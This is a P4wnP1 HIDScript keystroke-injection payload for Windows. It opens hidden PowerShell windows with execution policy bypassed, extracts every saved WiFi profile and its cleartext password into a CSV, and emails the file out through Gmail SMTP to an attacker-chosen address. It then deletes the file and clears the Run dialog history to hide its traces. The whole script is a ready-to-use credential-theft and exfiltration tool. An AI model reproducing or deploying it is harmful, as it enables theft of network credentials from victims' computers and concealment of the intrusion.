//P4wnP1 HiDscript - Gather WiFi data and email it.
//Change line 25 and 45 ('Desktop') to location you want file saved
//Change line 45 'GMAIL_USERNAME'<-username ONLY, 'GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
//Change line 65 to set location file was saved
  
layout('us');			// US keyboard layout
typingSpeed(0,0)	// Type Fast

//Gather Wifi data & save file
delay(500);
press('GUI D');
delay(500);
press('GUI R');
delay(500);
type('cmd');
delay(300);
press('ENTER');
delay(1000);
type("MODE 20,1");
press('ENTER');
delay(100);
type("COLOR EF");
press('ENTER');
delay(100);
type("powershell -NoP -NonI -W Hidden -Exec Bypass \"$DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv wifi.csv");
press('ENTER');
delay(500);

//Email file
delay(500);
press('GUI D');
delay(500);
press('GUI R');
delay(500);
type('cmd');
delay(300);
press('ENTER');
delay(1000);
type("MODE 20,1");
press('ENTER');
delay(100);
type("COLOR EF");
press('ENTER');
delay(100);
type("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'P4wnP1 WiFi Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your P4wnP1'; $ReportEmail.Attachments.Add($DesktopPath + '\\wifi.csv'); $SMTPInfo.Send($ReportEmail)");
press('ENTER');


//Change to file location
delay(500);
press('GUI D');
delay(500);
press('GUI R');
delay(1000);
type('cmd');
delay(300);
press('ENTER');
delay(500);
type("MODE 20,1");
press('ENTER');
delay(100);
type("COLOR EF");
press('ENTER');
delay(100);
type("cd %UserProfile%\\Desktop");
press('ENTER');
delay(100);

//Delete file
type("del wifi.csv");
press('ENTER');
delay(100);
type("exit");
delay(100);
press('ENTER');
delay(100);
press('GUI R');
delay(300);
type("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
delay(100);
press('ENTER');
delay(100);
